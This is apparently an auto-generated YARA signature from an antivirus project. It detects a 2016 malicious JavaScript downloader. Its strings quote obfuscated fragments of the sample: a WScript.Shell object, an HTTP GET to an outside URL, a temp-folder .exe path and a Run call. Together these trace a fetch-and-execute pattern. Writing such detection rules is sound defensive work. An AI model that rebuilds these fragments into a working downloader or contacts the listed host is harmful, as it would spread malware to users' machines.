rule sig_20160401_90282dc28f645e2401b10c24c5f6b7d8 {
  meta:
    description = "datamaliciousorder - file 20160401_90282dc28f645e2401b10c24c5f6b7d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "49d305d6d5748d9614834a568a20598367d32dd88145f046750fe0538a0afe0b"

  strings:
    $s1  = "function LeRl(GcPaa, GuoHu){BmtZf = BmtZf * 1; return GcPaa - GuoHu;};" fullword ascii
    $s2  = "var SyyGq = function AgsAcl() {return WScript[MhnIzc](\"WScript\"+\".Shell\");}(), JjWd = 11;" fullword ascii
    $s3  = "if (CnlWl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "CnlWl[LmmPz](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s5  = "function OvOs() {return SyyGq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"72ghe5nueG2qjzE.ex\" + \"e\";};" fullword ascii
    $s6  = "function DpTzs(){return UqfYx + \"\";};" fullword ascii
    $s7  = "function HpDyl() {return ((AroSlo == true) && (AroSlo == RprQw)) ? 1 : BmtZf;};" fullword ascii
    $s8  = "function HnyTze(XrfZe){SyyGq[\"R\"+\"un\"](XrfZe, BmtZf, BmtZf);};" fullword ascii
    $s9  = "var AroSlo = false;" fullword ascii
    $s10 = "var MjKx0 = new this[\"Date\"]();" fullword ascii
    $s11 = "return LeRl(PmhWu, NtrVyc);" fullword ascii
    $s12 = "var RprQw = false;" fullword ascii
    $s13 = "}while (UeOtl);" fullword ascii
    $s14 = "var OwrVrf = false;" fullword ascii
    $s15 = "function MsEo()" fullword ascii
    $s16 = "function YbGn(){return MhnIzc;};" fullword ascii
    $s17 = "function SyfBl(AbAjk) {var LcwDng = (1, 2, 3, 4, 5, AbAjk); return LcwDng;};" fullword ascii
    $s18 = "function KqqCy(){return 23;};" fullword ascii
    $s19 = "RprQw = true; " fullword ascii
    $s20 = "AroSlo = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}